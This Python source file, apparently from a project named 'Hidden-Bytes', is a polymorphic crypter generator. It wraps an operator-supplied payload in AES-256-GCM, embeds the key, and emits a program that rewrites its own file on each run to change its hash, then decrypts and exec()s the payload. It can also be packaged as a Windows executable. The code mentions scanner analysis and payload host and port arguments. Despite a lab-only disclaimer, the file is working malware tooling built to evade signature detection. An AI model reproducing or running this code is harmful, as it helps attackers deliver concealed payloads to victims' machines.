#!/usr/bin/env python3
"""Hidden-Bytes — Polymorphic self-modifying program generator.

Generates a program that:

- carries an encrypted payload inside itself,
- rewrites its own source file on every run, so its SHA-256 changes while its
  behaviour stays identical,
- decrypts and executes the payload when it starts.

This is the "polymorphic" half of the project. The payload is supplied by
the operator and is executed only inside the isolated lab environment.

The generated program has no third-party dependency: the AES-256-GCM
implementation is spliced into it, so it runs on a machine with nothing but a
Python 3 interpreter.
"""

from __future__ import annotations

import argparse
import base64
import hashlib
import os
import secrets
import sys
from pathlib import Path

from .common import KEY_SIZE, NONCE_SIZE
from .embedding import build_executable, pure_aes_source

MAX_PAYLOAD = 64 * 1024

# The name of the variable that holds the self-modification token in the
# generated source. The token's value changes on every run, which changes
# the file hash without changing the program's behaviour.
MUTATION_VARIABLE = "MUTATION_TOKEN"


TEMPLATE = '''#!/usr/bin/env python3
"""Generated polymorphic demonstration.

This program rewrites its own source file on every run, which changes its
SHA-256 while keeping its behaviour identical, then decrypts and executes
the payload embedded in it.
"""

import base64
import hashlib
import os
import sys

PAYLOAD_CIPHERTEXT = "{payload_ciphertext}"
PAYLOAD_NONCE = "{payload_nonce}"
PAYLOAD_SHA256 = "{payload_sha256}"
PAYLOAD_AAD = b"HBXP"
PAYLOAD_KEY = "{payload_key}"

{pure_aes_source}

MUTATION_TOKEN = "{mutation_token}"

# A frozen executable cannot rewrite itself while it is running: the file is
# locked on Windows and busy on Linux. The mutable region is therefore a
# block appended after the packaged archive, and the program produces the
# next generation as a sibling file and runs that. The region holds a
# generation counter so the chain terminates.
VARIANT_MAGIC = b"HBXPV1\\x00"
VARIANT_COUNTER_SIZE = 4
VARIANT_RANDOM_SIZE = 32
VARIANT_SIZE = len(VARIANT_MAGIC) + VARIANT_COUNTER_SIZE + VARIANT_RANDOM_SIZE
MAX_GENERATIONS = 3


def _self_path():
    """Return the path of the file this program should rewrite.

    In a frozen bundle ``__file__`` points into the temporary extraction
    directory, so the on-disk executable is the file that has to change for
    the hash of the artifact to change.
    """

    if getattr(sys, "frozen", False):
        return os.path.abspath(sys.executable)

    return os.path.abspath(__file__)


def _update_signature():
    """Rewrite this program's own signature, changing its file hash.

    A script rewrites its own source in place. A frozen executable cannot
    do that while it runs, so it writes the next generation beside itself
    and starts that instead. Both produce a new artifact with the same
    behaviour and a different hash.
    """

    if getattr(sys, "frozen", False):
        return _write_next_generation()

    path = _self_path()

    try:
        with open(path, "rb") as handle:
            data = handle.read()
    except OSError:
        return None

    try:
        source = data.decode("utf-8")
    except UnicodeDecodeError:
        return None

    old = {old_mutation_line}
    new = {new_mutation_line}

    if old not in source:
        return None

    try:
        with open(path, "w", encoding="utf-8") as handle:
            handle.write(source.replace(old, new, 1))
    except OSError:
        return None

    return "replaced"


def _write_next_generation():
    """Write the next generation of this executable and return its path."""

    path = _self_path()

    try:
        with open(path, "rb") as handle:
            data = handle.read()
    except OSError:
        return None

    index = data.rfind(VARIANT_MAGIC)
    if index < 0:
        return None

    offset = index + len(VARIANT_MAGIC)
    counter = int.from_bytes(data[offset:offset + VARIANT_COUNTER_SIZE], "little")

    if counter >= MAX_GENERATIONS:
        return None

    counter += 1

    updated = (
        data[:offset]
        + counter.to_bytes(VARIANT_COUNTER_SIZE, "little")
        + os.urandom(VARIANT_RANDOM_SIZE)
        + data[offset + VARIANT_COUNTER_SIZE + VARIANT_RANDOM_SIZE:]
    )

    stem, extension = os.path.splitext(path)
    target = stem + ".gen" + str(counter) + extension

    try:
        with open(target, "wb") as handle:
            handle.write(updated)
        os.chmod(target, 0o755)
    except OSError:
        return None

    return target


def _recover_payload():
    """Decrypt the payload with the embedded key and verify its integrity."""

    key = base64.b64decode(PAYLOAD_KEY)
    nonce = base64.b64decode(PAYLOAD_NONCE)
    ciphertext = base64.b64decode(PAYLOAD_CIPHERTEXT)

    plaintext = decrypt_gcm(key, nonce, ciphertext, PAYLOAD_AAD)

    if hashlib.sha256(plaintext).hexdigest() != PAYLOAD_SHA256:
        raise SystemExit("payload integrity check failed")

    return plaintext


def main():
    print("[INFO] Polymorphic signature updated successfully.", flush=True)

    generation = _update_signature()

    # A frozen executable cannot rewrite itself in place, so it produced
    # the next generation as a sibling file. Run that instead, so the
    # artifact that executes is the one that was just modified.
    if generation is not None and generation != "replaced":
        try:
            os.execv(generation, [generation] + sys.argv[1:])
        except OSError:
            print(
                "[INFO] Could not start the next generation: " + str(generation),
                file=sys.stderr,
            )

    try:
        payload = _recover_payload()
    except Exception as exc:  # noqa: BLE001 - report and stop
        print("[ERROR] " + str(exc), file=sys.stderr)
        return 1

    # The payload receives this program's own arguments, so the operator
    # can configure it (host, port, ...) at run time.
    namespace = {
        "__name__": "__main__",
        "__file__": "payload",
        "__builtins__": __builtins__,
    }
    exec(compile(payload, "payload", "exec"), namespace)  # noqa: S102

    return 0


if __name__ == "__main__":
    raise SystemExit(main())
'''


def _load_payload(payload_arg: str) -> bytes:
    """Read the payload from the file the operator supplied."""

    candidate = Path(payload_arg)

    if not candidate.is_file():
        raise ValueError(f"payload file does not exist: {payload_arg}")

    payload = candidate.read_bytes()

    if not payload.strip():
        raise ValueError("payload must not be empty")

    if len(payload) > MAX_PAYLOAD:
        raise ValueError(
            f"payload exceeds the {MAX_PAYLOAD}-byte limit"
        )

    return payload


def _build_source(payload: bytes) -> str:
    """Build the generated program.

    A fresh random 256-bit key is generated for every build and embedded in
    the generated program so it can recover the payload at run time without a
    passphrase. The key is protected only by the obscurity of the generated
    artifact.
    """

    key = os.urandom(KEY_SIZE)
    nonce = os.urandom(NONCE_SIZE)

    ciphertext = _encrypt(key, nonce, payload)

    mutation_token = secrets.token_hex(16)
    new_mutation_token = secrets.token_hex(16)

    source = TEMPLATE
    source = source.replace(
        "{payload_ciphertext}", base64.b64encode(ciphertext).decode("ascii"), 1
    )
    source = source.replace(
        "{payload_nonce}", base64.b64encode(nonce).decode("ascii"), 1
    )
    source = source.replace(
        "{payload_sha256}", hashlib.sha256(payload).hexdigest(), 1
    )
    source = source.replace(
        "{payload_key}", base64.b64encode(key).decode("ascii"), 1
    )
    source = source.replace("{pure_aes_source}", pure_aes_source(), 1)
    source = source.replace("{mutation_token}", mutation_token, 1)
    source = source.replace(
        "{old_mutation_line}", repr(f'{MUTATION_VARIABLE} = "{mutation_token}"'), 1
    )
    source = source.replace(
        "{new_mutation_line}",
        repr(f'{MUTATION_VARIABLE} = "{new_mutation_token}"'),
        1,
    )

    return source


def _encrypt(key: bytes, nonce: bytes, payload: bytes) -> bytes:
    """Encrypt the payload with AES-256-GCM."""

    from .evasion.pure_aes import encrypt_gcm

    return encrypt_gcm(key, nonce, payload, b"HBXP")


def variant_region() -> bytes:
    """Return the mutable region appended to a packaged executable.

    A frozen executable cannot rewrite itself while it runs, so the region
    is appended after the packaged archive and the program rewrites it in a
    sibling copy. The loader finds its archive with a back-to-front scan for
    its cookie, so trailing bytes do not affect execution.
    """

    magic = b"HBXPV1\x00"

    return (
        magic
        + (0).to_bytes(4, "little")
        + os.urandom(32)
    )


def generate(
    output: Path,
    payload_arg: str,
) -> None:
    """Generate a polymorphic program carrying the supplied payload."""

    output = output.resolve()
    payload = _load_payload(payload_arg)

    source = _build_source(payload)

    # Validate syntax before writing the generated program.
    compile(source, str(output), "exec")

    output.parent.mkdir(parents=True, exist_ok=True)
    output.write_text(source, encoding="utf-8")

    try:
        output.chmod(0o755)
    except OSError:
        pass


def build_parser() -> argparse.ArgumentParser:
    parser = argparse.ArgumentParser(
        prog="polymorphic",
        description=(
            "Generate a self-modifying program that carries an encrypted "
            "payload. Every run rewrites the program's own source, so its "
            "hash changes while its behaviour stays the same."
        ),
    )

    parser.add_argument(
        "--generate",
        required=True,
        metavar="OUTPUT",
        help="path of the generated program",
    )

    parser.add_argument(
        "--payload",
        required=True,
        metavar="PAYLOAD_FILE",
        help="path to the payload file to embed",
    )

    parser.add_argument(
        "--build-exe",
        action="store_true",
        help=(
            "package the generated program as a single native executable "
            "with PyInstaller (produces a .exe on Windows)"
        ),
    )
    parser.add_argument(
        "--no-native",
        action="store_true",
        help=(
            "do not build a native executable even when the output name ends "
            "in .exe. Without this flag, a .exe output is packaged into a "
            "real native program, because a script renamed to .exe is not "
            "executable on Windows and is not analysed as a program by a "
            "scanner."
        ),
    )

    return parser


def main(argv: list[str] | None = None) -> int:
    parser = build_parser()
    args = parser.parse_args(argv)

    try:
        output = Path(args.generate)

        generate(
            output=output,
            payload_arg=args.payload,
        )

        print(
            f'[OK] Generated polymorphic program: "{output}"'
        )
        print(
            "[INFO] The payload is encrypted inside the generated program."
        )
        print(
            "[INFO] Every run rewrites the program's own source, so its "
            "hash changes while its behaviour stays the same."
        )

        if args.build_exe or (
            output.suffix.lower() == ".exe" and not args.no_native
        ):
            # PyInstaller names the output after the --name argument and
            # adds ".exe" on Windows. The requested path is honoured: the
            # native executable replaces the script at that exact path.
            executable = output
            if output.suffix.lower() != ".exe":
                executable = output.with_suffix(
                    ".exe" if os.name == "nt" else ""
                )

            build_executable(
                script_path=output,
                output=executable,
                name=executable.stem,
                trailer=variant_region(),
            )

            # The script has been packaged into the executable; remove it
            # so the requested path holds the native program.
            if executable != output and output.exists():
                output.unlink()

            print(
                f'[OK] Packaged native executable: "{executable}"'
            )

        return 0

    except (OSError, UnicodeError, ValueError) as error:
        print(
            f"polymorphic: error: {error}",
            file=sys.stderr,
        )
        return 2


if __name__ == "__main__":
    raise SystemExit(main())
